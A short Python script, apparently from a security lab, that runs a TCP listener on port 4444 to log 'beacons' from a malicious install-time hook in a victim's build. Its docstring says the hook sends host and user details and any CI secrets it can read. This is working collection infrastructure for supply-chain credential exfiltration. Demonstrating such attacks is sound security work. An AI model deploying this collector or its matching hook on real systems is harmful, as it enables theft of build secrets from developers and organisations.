"""
Lab collector — receives install-time BEACON check-ins (no shell).

Listens on :4444. Each time a victim's install hook fires, it connects, dumps a
context report (host, user, and any CI secrets it could read), and disconnects.
This box just logs what arrives — there is no command channel back to the victim.
"""
import socket
from datetime import datetime

PORT = 4444


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", PORT))
    srv.listen(5)
    print(f"[collector] listening on 0.0.0.0:{PORT} for install-time beacons...", flush=True)

    while True:
        conn, addr = srv.accept()
        ts = datetime.utcnow().strftime("%H:%M:%S")
        print("\n" + "=" * 60)
        print(f"[{ts}] BEACON from {addr[0]}:{addr[1]}")
        print("=" * 60, flush=True)
        with conn:
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                print(data.decode(errors="replace"), end="", flush=True)
        print("-" * 60)
        print("[collector] Install-time code reached the build env and exfiltrated"
              " context. No remote control — that's the point of the dummy payload.",
              flush=True)


if __name__ == "__main__":
    main()
